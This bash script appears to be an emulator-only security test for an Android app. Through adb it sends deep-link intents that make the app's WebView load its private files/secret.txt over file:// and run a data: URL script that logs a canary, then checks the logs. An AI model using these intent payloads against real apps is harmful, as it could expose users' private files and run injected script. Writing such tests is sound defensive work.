#!/usr/bin/env bash
# Threat 2 (SPEC section 2): attacker-chosen URL loaded into a WebView. EMULATOR ONLY. adb alone.
# Two payloads: the app's own private file over file://, and a data: page that runs JavaScript.
cd "$(dirname "$0")" && . ./_common.sh
echo "== t2b: attacker URL in a WebView via ?url= (threat 2) =="
require_emulator; require_victim
TIMEOUT=20
reset_state
FILE_URI="https://shezguard.example/preview?url=file%3A%2F%2F%2Fdata%2Fuser%2F0%2F$VICTIM%2Ffiles%2Fsecret.txt"
# data:text/html,<script>console.log('CANARY-JS-'+(6*7))</script>  -> logs CANARY-JS-42 only if the script runs
JS_URI="https://shezguard.example/preview?url=data%3Atext%2Fhtml%2C%3Cscript%3Econsole.log(%27CANARY-JS-%27%2B(6*7))%3C%2Fscript%3E"
echo "ATTACK 1: load the app's private files/secret.txt through file://"
send "am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d '$FILE_URI' $VICTIM"
sleep 5
echo "ATTACK 2: load a data: page whose script computes the canary"
send "am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d '$JS_URI' $VICTIM"
echo "LOOK FOR: 'ShezDemo ... page text: ...CANARY-SECRET-7f3a...' and/or 'ShezDemo ... console: CANARY-JS-42'."
verdict "ShezDemo.*(CANARY-SECRET-7f3a|CANARY-JS-42)" "$VICTIM/\.demo\.PreviewActivity"
